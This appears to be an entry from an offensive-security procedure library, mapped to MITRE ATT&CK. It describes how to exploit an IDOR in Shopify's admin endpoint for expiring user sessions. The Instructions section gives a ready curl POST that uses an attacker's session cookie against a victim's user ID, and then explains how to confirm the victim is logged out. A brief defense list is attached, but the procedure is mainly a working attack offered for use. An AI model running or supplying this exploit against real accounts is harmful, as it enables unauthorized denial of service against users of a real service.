---
tags:
  - request-forward
  - dos
  - verification
  - shopify
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/expire-user-sessions-curl]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:25:29.785Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
id: 7f6c698f-01ee-4d6e-995f-3d0604bdafe9
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Forward-Modified-Request-and-Verify-Logout

## Summary

This procedure submits the tampered request to the server, expiring the victim's sessions, and verifies the denial-of-service effect through logout observation.

## Description

Forwarding the modified POST request exploits the IDOR, causing Shopify to process the expiration for the victim's account. All associated sessions are invalidated, forcing re-authentication and disrupting operations.

## Requirements

1. Modified request ready in proxy tool
2. Valid session cookies from attacker's account
3. Access to monitor victim's activity (e.g., shared account or notification)

## Defense

Defensive measures and detection strategies:

- Audit logs for session expiration events, alerting on high-frequency or cross-account actions
- Implement rate limiting on session management endpoints
- Notify users immediately upon session expiration with details

## Objectives

1. Execute the request to expire victim sessions
2. Confirm server acceptance without errors
3. Validate DoS impact on victim

## Instructions

### Step 1: Forward Request

**Context**: Send the tampered request to trigger expiration.

In Burp, click 'Forward' or use [[commands/expire-user-sessions-curl]] to submit:

```bash
curl -X POST 'https://admin.shopify.com/admin/settings/account/expire_specific_users_sessions/1234567' \
  -H 'Cookie: _shopify_s=attacker_session' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'utf8=%E2%9C%93&_method=patch&authenticity_token=abc123'
```

> Expected output: HTTP 200 OK or redirect, indicating processing.

### Step 2: Verify Victim Impact

**Context**: Check if the victim's sessions are invalidated.

Attempt access from victim's browser or notify victim; they should be logged out.

> Success: Victim redirected to login page on next interaction.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/expire-user-sessions-curl]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[request-forward]]
- [[dos]]
- [[verification]]
- [[shopify]]
